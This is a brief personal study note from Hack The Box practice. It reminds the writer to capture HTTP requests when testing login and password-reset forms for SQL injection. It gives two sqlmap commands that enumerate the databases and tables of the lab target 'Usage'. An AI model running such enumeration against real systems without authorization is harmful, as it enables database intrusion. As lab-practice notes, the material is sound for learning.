**Habit Building**
Remember to capture a request when looking for SQLi in login, reset forms
Example: [[Usage]]
```bash
"Get-Database": sqlmap -r Documents/HTB/Usage/email_sql --batch --level 3 --dbs
"Get Tables": sqlmap -r Documents/HTB/Usage/email_sql -p email --batch --level 3 -D usage_blog --tables --threads=10 
```
